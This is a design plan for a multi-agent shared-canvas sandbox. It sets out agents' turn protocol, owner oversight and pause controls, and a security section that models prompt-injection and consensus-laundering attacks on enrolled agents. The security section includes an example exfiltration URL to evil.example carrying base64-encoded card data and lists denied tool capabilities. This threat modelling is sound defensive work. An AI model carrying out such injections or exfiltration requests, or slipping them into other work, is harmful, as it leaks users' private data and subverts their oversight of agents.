# PLAN-38: Canvas Sandbox

> Status: DRAFT v1, 2026-07-27. Synthesis of six independent agent reviews
> (architecture, security, UI, UX/value, prior art, holistic) commissioned by
> Victor after the 2026-07-27 circles viability review. Nothing here is built.
> §9 lists the decisions that are Victor's, not mine.

## 0. The pitch, and what "watching" means

**The pitch (Victor's words):** the group canvas today is "just stale messages,
pretty boring." It should be "a sandbox where the agents can interact and the
users can join in and guide" — agents doing collective work while owners
observe, steer, and opt in and out.

**Clarified 2026-07-27, and it settles the plan's biggest argument.** "Watch the
agents" here means **oversight, not spectacle**: making sure they do not go down
too deep a rabbit hole, and keeping what they are doing visible to their owner.
The six commissioned reviews initially read "watch" as spectator entertainment
and spent considerable energy refuting it. That refutation stands as evidence
about a claim **this plan does not make**, and the two conclusions must not be
confused:

- **Spectating is not a retention mechanism.** Every watch-the-agents product
  died: Moltbook (1.5M agents week one, authenticity collapse and acqui-hire in
  six), SocialAI, Chirper, Claude Plays Pokemon (~95% viewer decay once the loops
  became familiar). Retention comes from residue: kept artifacts and standing
  work that names who it is waiting on.
- **Oversight is not optional and is not measured in engagement.** It is the
  control surface that makes bounded autonomy tolerable at all. Its success
  metric is "can the owner tell what their agent is doing, judge whether it is
  going somewhere dumb, and stop it in one tap" — never viewing time. **A
  low-traffic oversight pane is a working oversight pane.**

So the thesis is:

> The durable product is that **several private memories can safely work one
> shared artifact**. Visibility is what keeps that safe and steerable; the
> artifacts are what bring people back.

The thing nobody ships — separate humans' own agents, each carrying private
context, working one space — is a verified empty quadrant: OpenAI shipped group
chats with personal memory **forcibly disabled** and retired them 2026-07-09;
Claude Tag is one identity per channel; Notion/Miro agents are workspace
property, not member-owned. They all delete the private context because they
cannot scope the consent. A P2P friend group with per-member local nodes can.

**Design consequence: the oversight pane is a first-class deliverable in the
earliest phase that ships any autonomy, and rabbit-hole containment (§3.1) is a
requirement, not a P2 refinement.** It also happens to be the demo (§8), but
that is a side effect and never its justification.

### 0.1 What makes this structurally different from Moltbook

Three things, none of them vibes:

1. **Non-redundant information.** Moltbook was N copies of one model wearing
   hats: informationally redundant, so output was slop. Here, Sam's agent knows
   Sam's calendar conflict and Ana's knows her budget ceiling — data neither
   human typed into the room. **This is load-bearing: if the private-context
   pipe does not flow, the sandbox IS Moltbook in a living room.** §4 constrains
   how it may flow; §2 kills every card type that does not need it.
2. **Unfakeable identity.** Moltbook died on ~17,000 humans puppeting an average
   of 88 "agents" each. Per-member node-bound Ed25519 signatures make "that is
   really Maya's agent" a cryptographic fact.
3. **Kept artifacts with real approvals.** Moltbook sessions produced nothing
   anyone retained. Sessions here collapse into a study deck, an itinerary with
   receipts, a ratified Decision Card.

---

## 1. Architecture

Full proposal in the architecture review; the load-bearing decisions:

**The ledger already is the coordination layer.** `circle_events` (per-author
Ed25519 hash chains, deterministic folds, `canvas.ts` OR-Set + LWW) gives
attribution, replay, and dedupe for free. The sandbox therefore needs **no
distributed mutual exclusion and no coordinator**. The trick: do not prevent
concurrent moves, make them harmless. Rounds are a fold-level construct — at
most one move per (card, author, round) is honored — so two simultaneous agents
produce two valid contributions, and a mailbox-lagged member's late move folds
into its round retroactively, identically on every node.

**Speaker order** for round r = enrolled members sorted by
`sha256(cardId:r:pubkey)`: deterministic everywhere, rotates fairly, ungameable.
Timeouts only ever _permit_ later speakers; they never invalidate an earlier
move. Peer-claimed timestamps can therefore only cause an extra concurrent move
(absorbed by the fold key), never suppress one.

**Four new event types** ride the existing `circle/event.append` verb — no new
wire verbs, and old nodes tolerate them silently because the handler validates
chain and scan, not type: `sandbox.frame.put`, `sandbox.enroll.put`,
`sandbox.move`, `sandbox.close`.

**Enrollment splits in two halves**, which is what makes consent both safe and
cheap:

- **Private local row** (`circle_sandbox_enrollments`): mode, turn budget, token
  budget, guidance text, expiry. Gates all spend. **Never leaves the node.**
- **Public signed event** (`sandbox.enroll.put`): carries `mode` only. Peers
  need to know _whether_ you speak, not what you will spend.

**P0 does not need the gossip transport.** `fanOut` already publishes every
circle verb to the blinded topic when a bus exists, so the sandbox inherits mesh
delivery free on the day the fleet ships the orchestrator binary. Until then,
dial + mailbox + `syncEvents` converge exactly as the tab does.

**Sizing** (incl. tests at repo-typical ~40%): P0 ~2,200 LOC, P1 ~1,200, P2 ~800.
Reuse-first throughout: the quarantined sweep is the generation engine, the 15s
scheduler is the clock, `claimAgentDraft`'s guarded-UPDATE is the race pattern,
the drafts tray is the propose surface.

---

## 2. What the sandbox is FOR (card types, ranked)

The test a card type must pass: **could one agent with shared inputs produce
this?** If yes, the sandbox is overhead. Grades: A = impossible for one agent;
D = one agent does it better.

| Card                                                | Grade       | Why it needs many agents                                                                                                            |
| --------------------------------------------------- | ----------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **Constraint negotiation** (scheduling, trip/event) | **A**       | private calendars and budget ceilings cannot be centralized by definition                                                           |
| **Streak / commitment**                             | **A-**      | each agent attests its own human's progress from private evidence; no agent can attest for another                                  |
| **Threshold / group-buy** (Aubaine tie-in)          | **A-**      | blind private willingness folded to a threshold                                                                                     |
| **Standing watch**                                  | **B+**      | commodity watching **plus** scoring each hit against each human's private criteria; scoring is mandatory or the card is an RSS feed |
| **Study workbench**                                 | **B+ → A-** | A- only with blinded gap aggregation ("more coverage needed: enzyme kinetics" without exposing whose gap)                           |
| **Recurring-cost rationalizer**                     | **B+**      | private subscription inventories; quarterly cadence, so later                                                                       |

**Killed, with reasons:**

- **Collaborative research sprint (D).** The most demo-able and the emptiest.
  One agent with a browsing loop out-researches five coordinating; the output
  needs no private context; the ad-hoc substitute (one member runs deep research,
  pastes it) is genuinely fine. Salvaged as the option-generation _phase inside_
  negotiation, where each agent researches against its own human's criteria.
- **Gift coordination.** Served today by making a circle without the recipient.
  The interesting variant (recipient's agent leaks the wishlist) violates
  never-auto-disclose and is creepy. Ship as a documented pattern, zero code.
- **Chore/meal rotation.** A deterministic fold plus a calendar. No rounds, no
  negotiation.
- **Plain cost-split.** The tab's largest-remainder fold already does it.
  Splitting is arithmetic.

**Retention rule (pre-registered):** every round must end in a state that
**names a specific human or a firing condition.** "Done, here's a summary" has
no Tuesday. "3 of 4 voted, waiting on Ana" is the sandbox's equivalent of
Splitwise's unresolved balance, which is PLAN-31's best-evidenced retention
mechanism. The fold can always compute who blocks; the UI must say so.

**Onboarding gradient:** cards degrade to human-powered gracefully. A
negotiation card with ONE enrolled agent still works — that agent generates the
option set, everyone else votes by hand on the same card. The conversion moment
is engineered asymmetry: you are hand-entering availability for five slots while
Ana's slot filled itself from her calendar. The empty slot says so: _"You're
filling this by hand. Enroll your agent to fill it for you."_

---

## 3. UI: the oversight pane (and the anti-stale-wall contract)

Full wireframes in the UI review. Per §0, the pane's **primary job is oversight**:
answer "what is my agent doing, is it going somewhere dumb, how do I stop it"
without the owner having to read a transcript. The three decisions that matter:

1. **One card per session, and it collapses.** A session lives and dies as a
   single canvas card: `gathering → live → converging → done`. On completion the
   move feed disappears behind a "Replay" disclosure and the card shrinks to the
   artifact (itinerary, deck, decision) with a permanent provenance ribbon. This
   is the structural escape from "the canvas becomes its own wall of stale
   messages" — the exact failure we are fleeing.
2. **Artifact above feed; moves render as diffs.** Spectators see the product
   first, the process second. A move shows `+ Cabin B — $185/n` with a violet
   gutter, not a prose dump. The replay scrubber is a pure re-fold of the signed
   chain, so finished sessions are re-watchable rather than dead.
3. **Pause is never more than one visible tap away.** Solid consent-colored
   button in the dock while enrolled, plus a pinned banner on the canvas pane
   when the card is scrolled away: _"◆ Your agent is playing in 'Cabin hunt' ·
   Pause."_ No confirm dialog.

**Eleven dark patterns are banned by name** in the UI section; the four that
matter most: auto-mode is never preselected and never sticky across sessions; an
unapproved move ALWAYS lapses to a visible pass (expiry never publishes, keeping
PendingOutbound's invariant); no fake liveness (burst arrivals after a mailbox
drain render as "3 moves arrived, catching up," never animated as realtime); no
provenance laundering (agent output never ages into human-looking content).

Approval fatigue is handled by **one approval per turn, not per micro-action**,
rendered identically pre- and post-publish so approving is a glance-and-tap.
This is the shape the supervision literature endorses: Anthropic's own autonomy
telemetry (2026-02-18) shows experienced users move from per-action approval to
**monitor-and-intervene**, with interrupt rates _rising_ as they stop gating.
The oversight pane is the monitor; pause is the interrupt.

### 3.1 Rabbit-hole containment (requirement, not refinement)

Victor's stated worry, made mechanical. An agent goes "too deep" in four
distinguishable ways, and each gets its own detector and its own surfaced state,
because a silent stall and a productive long session must never look alike:

| Failure                                                                             | Detector                                                                                        | Surfaced as                                                                                  |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **Looping**: near-identical successive moves, or no new information across k rounds | no-progress detector over the fold (M4), local similarity check on our own last two moves       | auto-pause the enrollment, banner "your agent stopped making progress and paused itself"     |
| **Drifting**: moves stop relating to the card's goal                                | convergence band shows the goal restated next to the latest move; owner judgment, not a model's | visible divergence; one-tap steer or pause                                                   |
| **Grinding**: real progress, but far more expensive than the job is worth           | per-enrollment token + turn meters, visible on the posture chip as `4/10`                       | budget exhaustion pauses and asks; never silently continues                                  |
| **Stalling**: waiting on a peer who will never answer                               | turn deadline + presence freshness                                                              | "waiting on Bob's agent (passes at 4:12)", then a visible pass — never an indefinite spinner |

Three rules follow, and they are binding:

1. **Every terminal state is legible and attributed.** A session that ends
   because of a cap, a no-progress trip, or budget exhaustion says so in those
   words. "Quietly stopped" is a bug.
2. **Cap-hits are alarms, not routine.** Prior art is explicit (LangGraph
   practice): if more than ~1% of rounds hit the hard cap, the cap is masking a
   prompt bug. Instrument the rate; treat a rise as a defect signal.
3. **Fewer rounds is the default, not a limitation.** "Deliberative Illusion"
   (arXiv 2606.03032) finds facts decay and stances homogenize as rounds
   increase, and under equal token budget single-agent often beats multi-agent
   (arXiv 2604.02460). Default round caps stay low (3-5, hard ceiling 20) and
   every additional round must justify itself against §8's overhead gate. **The
   rabbit-hole risk and the quality risk point the same direction: shallow.**

### 3.2 The working surface `[v2 2026-07-27 — Victor: "the canvas needs to be doing a lot of work here"]`

Requirement as stated: agents that call tools and research the web, a
**propensity to create todo lists the user can scroll as items complete**, and
**thumbnails of pages visited**. Reference bar: Manus, Genspark. Four research
streams came back and three of them independently contradicted the obvious
implementation, so this section records what to build INSTEAD, and why.

#### 3.2.1 The finding that reshapes this: "watch it work" is a dead pattern

Every product built around watching an agent work live is discontinued.
OpenAI Operator (merged away 2025-07, site dead 2025-08), ChatGPT agent mode
(superseded 2026-07-09), ChatGPT Canvas (removed 2026-05-28), Pulse (sunset
2026-06-17), Atlas (retiring 2026-08-09), Copilot Workspace (sunset
2025-05-30). The 2026 survivors returned to **step lists, artifacts, and
screenshots on demand**. Across ~30 source fetches, **no organic user post
praised Manus's "Computer" pane by name** — every by-name mention traced to
marketing or affiliate content. A paid review put it plainly: _"You don't watch
it work. You come back later to a result."_

Live watching survived in exactly one niche: the **local browser sidecar**,
where the agent acts in your own authenticated session and supervision is
genuinely load-bearing. That niche is the one this plan is in (§0: oversight,
not spectacle) — so the pane survives, but it must be built as the survivors
built it, not as the graveyard did.

**Corollary, and it is the sharpest single sentence in the research:** the #1
trust destroyer is not hallucination, it is **silent success** — an agent
asserting done with nothing to show. What builds trust instead: _"make the
agent leave receipts as it goes."_ That is what §3.2.3 is.

#### 3.2.2 The multiplayer result nobody wanted to hear

GitHub's Agent HQ "mission control" — the shipped incarnation of "watch your
team's agents" — generated **near-zero practitioner discussion**: five HN
submissions totalling 6, 3, 2, 4 and 2 points with **zero substantive
comments**, against 564 points and 357 comments for Copilot coding agent.
Single-player fleet tools sustain hundreds of comments. Even vendors pitch it
single-player.

> Nobody said "I wish I could watch my coworker's agent." Many said "stop
> flooding me with PRs you didn't read."

The binding constraint for a group is therefore **not shared visibility**. It
is that **generation is cheap and private while verification is expensive and
social**, plus a measured attention ceiling of **3-5 concurrent agents** (six
independent sources, Jul 2025 - Apr 2026), with review throughput saturating
_lower_ than execution throughput.

This independently validates the design already in §3: N members' agents must
NOT render as N live panes. **Fidelity is a function of provenance** — your own
agent renders richly because it is local, first-party and tool-capable; every
peer's agent renders as an attested summary. That is simultaneously the
anti-wall mechanism and the §4 trust boundary, and now also the market answer.

#### 3.2.3 What ships instead of a wall of panes

1. **Receipts, not narration.** Every claim an agent publishes carries its
   sources. Verification tiers must be cheap: hover for the quote, click for
   the source. This is the mechanic that measurably builds trust.
2. **Evidence cards, not screenshots, across the wire** (§4b.4 and the media
   architecture). Cited sources only — never browsing history, which is itself
   a disclosure (§4b.5 T11).
3. **Your own agent's full trail stays local**, at full fidelity, including
   real screenshots. Playwright and sharp are already dependencies, so this is
   ~30 lines of glue, and it is where the oversight need actually lives.
4. **A needs-attention inbox, not a grid.** Both major vendors converged here
   independently. Order by **"needs input" before "is done"** — the absence of
   that signal is precisely what breaks supervision at N≥3.
5. **Shared WIP backpressure — the highest-leverage unbuilt mechanic in the
   corpus.** Cap the number of un-reviewed agent outputs in flight across the
   circle. No shipped product does this, it directly counters the
   cheap-generation/expensive-review asymmetry, and it composes exactly with
   the existing `MAX_PENDING_PER_CIRCLE` precedent.
6. **The work ratio as the glance:** `4 of 10 turns · 3 deltas`. A delta is a
   contribution that changed the artifact, so `10 turns · 0 deltas` reads as a
   rabbit hole with no training and no detector firing. Deliberately not an
   activity count — activity counts reward busywork.

#### 3.2.4 Todo lists: build the gate and the diff, not the ticker

Victor asked for scrollable todo lists. The evidence says the instinct points
at something real but one step to its left:

- **Both famous implementations were withdrawn.** Manus abandoned `todo.md`
  after finding **~1/3 of all agent actions were spent updating it**. Anthropic
  disabled `TodoWrite` by default (Claude Code v2.1.142, 2026-05-14) in favour
  of a dependency graph. There is a measured cost bug too: todo updates
  invalidate the whole prompt cache **even when byte-identical**.
- **The measured oversight benefit is pre-flight, not mid-run.** A controlled
  study (arXiv:2604.04918, N=48, live web, four oversight strategies) found
  plan-based strategies lowered **problematic-action occurrence** without
  equivalent gains in **runtime intervention**. Users confirm it: an agent
  announced it would skip tests, _"but only as it happens and that scrolls by
  pretty quick."_
- **This lands on the same moment §4b.3 reaches from the security side** — the
  human tap belongs on the _plan_, before egress. Two independent routes to one
  decision; it is now the best-supported choice in this plan.

So the design is:

| Ship                                                                                                                                                                                                                   | Do not ship                                    |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| **Plan approved before execution**, editable, offering `Approve / Approve with edits / Keep planning` (a bare accept-or-cancel collapses into an approve button)                                                       | A live ticker as the primary oversight surface |
| **Plan-vs-actual diff — the clearest unoccupied ground in the field.** Nobody ships it; it maps exactly to rabbit-hole detection. Mark steps `deviated` and show the delta                                             | Silent deviation (today's universal norm)      |
| **`blocked` as a real state with a required reason.** Verified: Claude Code's shipped schema has no `blocked`, so blocked tasks render `in_progress` forever — the mechanical root of users distrusting these displays | Blocked-as-in_progress                         |
| **Evidence-gated completion.** A step cannot self-mark done without an artifact. Called the highest-leverage single item in the corpus; matches "progress is derived from the fold, never sender-claimed"              | Self-asserted completion                       |
| Ambient, capped, **updated** item list (never rewritten wholesale)                                                                                                                                                     | Unbounded lists; full-list rewrite churn       |

The wire object is `sandbox.plan.put {card_id, round, steps[≤12]{id, label,
state}, updated_at}` — under 2KB, no media problems, and progress derived from
the fold so it cannot be inflated. **This is the cheapest item in §3.2 and the
one that does the most for the actual ask.**

#### 3.2.5 Banned outright

Fake or cosmetic progress; mood phrases ("almost done", "finalizing");
self-asserted completion; blocked-rendered-as-working; full-list rewrite churn;
unbounded lists; raw trace as the primary surface; decorative plans that are
never diffed against behaviour; post-hoc narrative labelled "what the agent is
thinking" (models verbalize reward hacking <2% of the time); approve-everything
gates. Plus one from the visual research: **never couple the pane to
execution** — the single genuine pane complaint found anywhere was a product
where occluding the view stalled the task, punishing exactly the walk-away
behaviour every user exhibits.

---

## 4b. Tools: what an enrolled agent may actually do `[v2 2026-07-27]`

Victor's ask ("agents call tools and skills, research the web, show what they
found") collides head-on with **I3, which said sandbox generation is
tool-less**. Both the security red team and the media architect independently
refused to let that be relaxed silently. It is amended explicitly instead.

### 4b.1 The hypothesis that failed

The coordinator proposed: the danger is tools that read _private state_ or
generations that both ingest untrusted content _and_ act; a read-only public
fetch is merely more untrusted input. **Refuted, decisively:**

> A GET is egress, and egress is exfiltration. "Read-only" describes the effect
> on _my_ state, not on the world.

An outbound request carries attacker-chosen bytes in path and query, so
`https://evil.example/c?d=<base64 of the card>` publishes circle content to a
third party with no member ever seeing it. Read-only is the wrong axis. The
right axes: does it read state outside the allowed context set; does it cause
anything to **leave the node**; does it have effects a human would care about.

### 4b.2 Rulings

| Ask                                               | Ruling                                                                                                                                                                                                                                                                                                         |
| ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Tools during a session                            | **Yes, narrowly** — a two-entry allowlist: `web_search`, `web_fetch`                                                                                                                                                                                                                                           |
| Research the live web                             | **Yes, propose-mode only**, behind a plan tap and an egress broker                                                                                                                                                                                                                                             |
| Invoke skills (any tier or origin, incl. bundled) | **Refused.** Skills reach the model _as prompt text_, so a skill in a sandbox frame is a third party writing the trusted instruction frame — exactly T2. The existing capability system cannot serve as the boundary: it is union-based, bypasses non-sensitive calls, and no-ops entirely on an empty P2P set |
| Thumbnails/screengrabs **across the wire**        | **Refused for v1.** Own-agent-local screenshots: yes (§3.2.3)                                                                                                                                                                                                                                                  |
| Visible todo lists                                | **Yes**, as typed data, never prose (§3.2.4)                                                                                                                                                                                                                                                                   |

Absolute deny list, enforced by tool **absence** rather than refusal: wallet and
payment paths, `message_tool` and all channel actions, the `circles` tool
itself (an agent writing to the circle out-of-band bypasses the whole move
grammar), `skill_manage`, all memory/recall/dream tools, `code_interpreter`,
`browser_tool`, `computer_use`, filesystem read and write, calendar read.
PLAN-20 interceptors must be **off** for sandbox turns — they are
third-party-authored code on `before_tool_call`, i.e. a direct bypass of the
egress broker.

### 4b.3 The turn shape (five steps, tap before egress)

1. **Planner** (LLM, tool-less) — sees card state in the untrusted envelope,
   emits a rigid plan drawn from a closed action set: `search(query)` |
   `fetch(url)` | `compose`. It selects actions; it does not write instructions.
2. **Plan tap** (human) — literal queries and URLs approved, edited or
   rejected. **This is where egress consent lives.** Approving the resulting
   _move_ instead would be auditing the crime scene: exfiltration completes at
   fetch time.
3. **Executor** — **no LLM at all**, so the approved plan and the executed plan
   are byte-identical by construction. This is what makes the approval mean
   something.
4. **Summarizer** (LLM, tool-less, isolated) — reads fetched pages, sees **no**
   circle content, has no ledger write and no egress, emits a typed record.
   The generation touching the most hostile content has the least capability.
5. **Composer** (LLM, tool-less) — writes the move from that squeezed
   derivative; then R6 grammar validation, R14 output validation, propose tap.

Invariant bought: **no single generation both ingests fetched content and
selects egress.**

### 4b.4 The cost, quantified

Web access moves the T1 laundering threat from **betrayal by one of ~4-15
accountable friends** (invited, keyed, rate-limited, socially exposed,
removable) to an **unauthenticated, unattributable, unremovable,
pre-positionable, internet-scale** attacker who can poison pages and wait, and
serve different content to an agent's user-agent than to a human's browser.
That is a category change, not a severity bump — and it is why step 4 squeezes
webpage-to-ledger bandwidth to a typed record.

### 4b.5 New threats and invariants

- **T10 — Evidence forgery.** A node can screenshot anything, or synthesize an
  image, and sign it honestly. Signatures prove _who is accountable_, never
  _that the page said that_. A screenshot is the most credibility-laundering
  artifact that exists, and a phishing-lookalike screenshot **has no technical
  mitigation** — which is the disqualifying reason for cross-member images in
  v1. Mitigation is UI: the URL renders verbatim beside any image, never
  full-bleed, always inside "captured by X's agent" chrome.
- **T11 — Source lists leak private constraints.** If my agent researches
  against my private ceiling, the source list _encodes_ it: publishing
  `kayak.com/flights?max=900` tells the circle Ana's $900 limit that she never
  typed. Mitigation: per-source opt-in at publish (default off), and **only
  scheme+host** ever crosses the wire — never path or query.
- **I11 — No third-party instruction text in a sandbox frame.** No skill, any
  tier, any origin.
- **I12 — No agent ingests canvas images.** Images, if they ever exist, are for
  human eyes only. (Agent Smith: a shared multimodal artifact ingested by a
  population of agents is the literal setup for population-level infection.)

Requirements R21-R34 (fail-closed literal allowlist, denial-by-absence, zero
skills, interceptors off, plan-then-execute, egress broker with pinned SSRF and
an append-only egress log, dual-LLM typed summarizer, transitive `web:<host>`
provenance, per-enrollment egress budget, no images, typed todo items,
approval-fatigue cap with diff surfacing, and **tools and auto-append mutually
exclusive in every phase**) are carried in full in the security section text
and are binding.

---

## 4. Security (this section governs)

The security review is the longest and it wins ties. Its framing:

> Today's safety rests on peer content being a **leaf**: it enters wrapped,
> generation is tool-less and memory-less, and output reaches exactly one human
> who decides if it ever becomes wire traffic. The sandbox makes peer content a
> **node in a cycle**. Three current controls silently stop working.

### 4.1 The four critical threats

- **T1 Authorship laundering / manufactured consensus.** A's payload, phrased as
  ordinary task content, is paraphrased by B's agent and arrives at C signed by
  B under B's petname. A is structurally erased at hop 1. By round 4 the card
  asserts a group decision no human made. **This is not prompt injection, it is
  manufactured consensus, and no prompt hardening touches it.**
- **T2 Peer-authored task frame in the trusted position.** The likeliest
  implementation mistake. Canvas cards are LWW-editable by any member, so if a
  card's task text lands in the instruction frame, one event takes over every
  enrolled agent in the circle.
- **T3 Personal context × auto-append = exfiltration engine.** Phase 4b put
  member-own mastery in the trusted frame **only because its output cannot reach
  the wire**. Citing 4b as license for "useful context + autonomous output" gets
  the precedent exactly backwards.
- **T9 Memory-taint classifier gap.** `agent:main:canvas:*` and
  `agent:main:sandbox:*` classify **first_party** today (`circle`/`circles` are
  in `UNTRUSTED_TOKENS`, `canvas` is deliberately not). _Verified independently:
  no such session keys exist yet, so nothing is currently mis-classified — it is
  a loaded footgun that fires the moment PLAN-38 names sessions the natural way._
  **Fix it now, ahead of any sandbox code** (§7 P0.0).

Also ranked HIGH: ping-pong burn with ~1:10,000 cost asymmetry (attacker sends
bytes, victims pay inference); turn protocol is honor-system beyond signatures;
**fork-freeze amplification** (a differing event at an existing seq freezes the
_entire circle_ — autonomous high-rate appending turns a rare accident into a
one-envelope repeatable brick); smuggling through receiver-side special paths
(the invite-code regex renders a Join button on any inbound body; the mermaid
`dangerouslySetInnerHTML` sink).

### 4.2 Non-relaxable invariants (a phase that needs one relaxed does not ship)

- **I1** No generation may include recall-eligible memory, retrieval, or session history.
- **I2** Trusted personal context and circle-facing output are **mutually exclusive**. Either personal context + human review before the wire, or auto-append + card-scoped context only. Never both.
- **I3** _[AMENDED 2026-07-27 — see §4b]_ **Capability floor for circle-facing generation.** No such generation may hold payment, messaging, memory, filesystem, skill-mutation, code-execution, browser-automation, or agent-control capability, in any mode or phase. Absolute; not relaxable by config, enrollment, task type, or phase. The single admissible capability above the floor is **retrieval of public web content**, and only with all four of: a fail-closed literal allowlist; human approval of every egress before any request is issued; no single generation both ingesting fetched content and selecting egress; and fetched content reaching the composing generation only as a typed, bounded, marker-stripped derivative carrying `web:<host>` provenance. Where any of those is unavailable, the generation is tool-less.
- **I4** Consent is node-local-authoritative. No peer assertion authorizes generation or spend on my node.
- **I5** Spend is bounded by a budget only my human can refill. No protocol message may raise it.
- **I6** Agents never summon agents. The relaxation is peer-triggered generation _within an enrollment I created_.
- **I7** Free-text agent output never reaches the wire without a human seeing it.
- **I8** All peer content, including peer _agent_ content, enters prompts wrapped, forever. Friendship changes rate limits, never trust level.
- **I9** The model never controls envelope structure.
- **I10** Every autonomously generated artifact is labeled on the row, in the UI, and on the wire (EU AI Act Art. 50(2), applies 2026-08-02).

### 4.3 The six pieces of machinery auto-mode cannot ship without

M1 provenance sets carried as **signed data** (`derived_from` + transitive author
set, recomputed receiver-side); M2 local enrollment ledger with spend-time AND
publish-time re-checks; M3 persisted per-enrollment token meter with human-only
refill; M4 round barrier + no-progress detector; M5 constrained move grammar with
server-side value validation; M6 sandbox chain namespace with author-scoped fork
containment (so a sandbox fork cannot freeze chat and the tab).

### 4.4 Honest accounting: what is theater

**Holds:** context-set restriction, consumption-side budgets, local-authoritative
consent, server-constructed envelopes, provenance-as-data, narrow move grammars.
**Theater if counted as a primary control:** per-round injection scanning
(regex; ~zero recall after one LLM paraphrase — keep it, never count it as a
chain defense), "never follow instructions in the content" wording, "never write
@agent" as a rule rather than a code path, sender-asserted `agent_authored`,
advertised enrollment state, any taint label inferred from text.

---

## 5. Prior art worth stealing

- **Stacked termination**: hard round cap AND semantic done-check AND per-agent
  budget. Treat cap-hits as alarms, not routine (>1% means a prompt bug).
- **Draft-PR semantics on a CRDT** (GitHub Copilot agent + Google Docs suggested
  edits + Ink & Switch Patchwork): agent output is an inert signed proposal until
  a signed human acceptance commits it. That is propose-mode, already validated.
- **Matrix × Secure Scuttlebutt**: signed per-identity append-only feeds in a
  hash-linked DAG, ten years in production. Bind **agent signature + the human
  enrollment grant that authorized it** — this closes an audit hole A2A v1.0.0
  still has (unattested delegation) and defeats Agent-in-the-Middle (>70% ASR on
  unsigned chains, up to 98.5% on chain topologies).
- **Source-blinding during deliberation.** Sycophancy research (arXiv 2510.07517)
  finds anonymizing message sources nearly eliminates identity-driven conformity,
  and "Deliberative Illusion" (2606.03032) finds facts decay and stances
  homogenize as rounds increase. So: **blind authorship inside the agent's
  deliberation frame (opaque `M1..Mn` ids), keep full signed attribution for the
  human view and the audit.** Cheap here, impossible without a provenance layer.
- **Blackboard multi-agent** (arXiv 2510.01285) is the closest architectural
  prior art to a shared canvas and should be read in full before P1.
- **Caution with receipts:** orchestrator-less multi-agent has **zero shipped
  precedent**; multi-agent costs ~15x single-agent tokens; under equal budget
  single-agent often wins. Design for **few rounds of parallel independent work
  reconciled on the ledger, not debate.**

---

## 6. Where the reviews disagreed (surfaced, not smoothed)

1. **Auto-mode free-text.** Architecture proposed free-text moves publishable in
   auto mode. Security refuses (**I7/R6**): free-text carries unbounded payload
   and is the T1 laundering vector. **Resolved in favor of security** — auto-mode
   is constrained move types only (a vote must reproduce one card option byte-
   identically); free text is propose-only, permanently.
2. **How central is the live view. RESOLVED BY CLARIFICATION, not by
   adjudication (2026-07-27).** The reviews argued against
   watching-as-entertainment; Victor meant watching-as-oversight (rabbit-hole
   containment + visibility of what your agent is doing). Those are different
   claims and both hold: **spectating is not a retention mechanism, and
   oversight is mandatory regardless of how much anyone looks at it.** The
   dispute was a misreading of the brief, and the reviews' anti-spectacle
   evidence is retained only as a caution against _marketing_ the show. See §0.
   Consequence: the oversight pane and §3.1 containment ship in the first phase
   that ships any autonomy, and no engagement metric may retire them.
3. **Multi-agent rounds at all.** Holistic notes the month-3 survivors (watch,
   study lens) are single-agent degenerate cases and would ship the scheduler
   first; UX says the flagship (negotiation, grade A) is irreducibly multi-agent.
   **Resolved by phasing**: single-agent standing card first (cheap, safe,
   retention-bearing), multi-agent negotiation second, with the overhead gate in
   §7 deciding whether rounds ever earn their cost.

---

## 7. Phasing (revised to satisfy all six lenses)

**P0.0 — Close the taint gap first (hours, do regardless of this plan).**
Add `canvas` and `sandbox` to `UNTRUSTED_TOKENS`; assert both key shapes classify
`untrusted` in `session-trust.test.ts`; add the §5.2 CI guard forbidding any
memory writer from reading circle tables.

**~~P-1 — Evidence before engine.~~ SKIPPED by decision 2026-07-27.** Victor's
rationale: he is the first user, can test the built thing directly, and will
adjust on the fly. Legitimate for a solo builder who dogfoods, and recorded here
with its consequence rather than as a complaint: **the design is now validated by
building it, so the build order inside P1 must preserve the ability to adjust.**
That is why P1 below is specified as a thin end-to-end slice first, breadth
second. The §8 gates are unchanged and now get read against dogfood rather than
prototype interviews.

**P1 — Multi-agent negotiation, propose-mode only (~1,400-1,800 LOC).** Chosen
over the single-agent watch card by decision 2026-07-27 ("be efficient, go full
multi-agent"): the flagship grade-A card, and the only one that tests the actual
thesis. Full turn loop, fold, deterministic speaker order, round barrier,
provenance sets (M1), opaque-id source blinding, sandbox chain namespace (M6),
oversight pane + §3.1 containment. Every move is a proposal awaiting its own
human's tap; no autonomous posting anywhere in this phase.

> **P1.0 — Solo-degraded mode is now load-bearing infrastructure, not
> onboarding polish.** Consequence of skipping P-1: with no prototype and no
> second installed human, **the practice partner is the only test harness that
> exists.** A negotiation card must run end to end with one real member plus the
> labeled practice agent, or the phase cannot be exercised at all before it
> ships. This moves from "ships in this phase" (v1) to "ships FIRST in this
> phase, before the second real member is ever required."
>
> Build order inside P1, thin slice first so course-correction stays cheap
> `[revised 2026-07-27 for the §3.2/§4b scope]`:
> **(a)** event types + fold + migration, incl. `sandbox.plan.put` and
> `sandbox.evidence.put` (no UI, tested headless);
> **(b)** one negotiation card, one round, practice partner as the second
> agent, propose-mode, rendered as: verdict band (work ratio), shared
> checklist, containment banner, live pill;
> **(c)** multi-round + convergence + containment detectors + plan-vs-actual
> diff;
> **(d)** tools — the §4b five-step turn with the plan tap and egress broker;
> **(e)** real second-node participation;
> **(f)** breadth (work view, evidence strip, replay scrubber, own-agent
> screenshots).
> Stop and reassess after (b): that is the first point where the thesis is
> visible on screen and the cheapest place to change your mind.
>
> **Scope warning, on the record.** The §3.2 UI alone is ~14 components,
> 900-1,200 LOC plus tests, against a P1 budget of 1,400-1,800 total. The
> escalated requirement materially blows P1. Tools (d) and the rich surface (f)
> are therefore sequenced AFTER the reassessment point rather than folded into
> the first slice, and (f) is explicitly a candidate for deferral depending on
> what (b) shows.

**P2 — Auto-append, constrained moves only (~800 LOC).** Gated on M1-M6 complete
AND a dedicated adversarial pass AND the §8 gates. Default off
(`circles.sandbox.enabled`), second separate opt-in per enrollment, propose
preselected always. **Refused entirely in any circle with removal history until
key rotation exists** (removal is advisory, gossip is unencrypted: autonomous
high-volume generation there is broadcasting to a known-hostile reader).

**Not scheduled:** free-text auto-append (violates I7); agent-set `card_type`
(mermaid sink); any personal/mastery context on a wire-reachable path (I2).

---

